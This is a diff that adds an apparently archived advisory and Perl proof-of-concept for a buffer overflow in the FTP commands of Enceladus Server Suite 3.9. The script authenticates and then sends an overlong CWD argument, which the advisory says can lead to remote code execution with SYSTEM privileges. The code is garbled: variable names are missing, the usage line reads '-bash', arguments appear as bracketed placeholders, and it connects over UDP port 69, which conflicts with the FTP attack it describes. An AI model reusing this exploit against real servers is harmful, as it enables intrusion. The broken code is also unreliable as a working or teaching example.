@@ -1,0 +1,54 @@
+source: http://www.securityfocus.com/bid/6345/info
+
+Enceladus Server Suite is prone to a remotely exploitable buffer overflow vulnerability. It is possible to trigger this condition by supplying an overly long value for several FTP commands. To exploit this issue, the attacker must be able to authenticate to the FTP server included in Enceladus and issue a maliciously crafted command.
+
+Successful exploitation will enable a remote attacker to execute arbitrary code with the privileges of the Enceladus Server Suite software, which will most likely run with SYSTEM (or equivalent) privileges. This vulnerability may also be used to cause a denial of service.
+
+This issue has been reported for Enceladus Server Suite 3.9. Other versions may also be affected.
+
+
+#!/usr/bin/perl -w
+
+
+
+use IO::Socket;
+
+
+
+ = "Mollensoft Software Enceladus Server Suite 3.9";
+
+
+
+unless (@ARGV == 3) {
+
+ print "\n By Sapient2003\n";
+
+ die "usage: -bash <host to exploit> <user> <password>\n";
+
+}
+
+print "\n By Sapient2003\n";
+
+
+
+ = "A" x 500;
+
+ = "USER [1]\nPASS [2]\nCWD ";
+
+
+
+ = IO::Socket::INET->new(
+
+        PeerAddr => [0],
+
+        PeerPort => 69,
+
+        Proto    => "udp",
+
+) or die "Can't find host [0]\n";
+
+print  ;
+
+print "Attempted to exploit [0]\n";
+
+close();
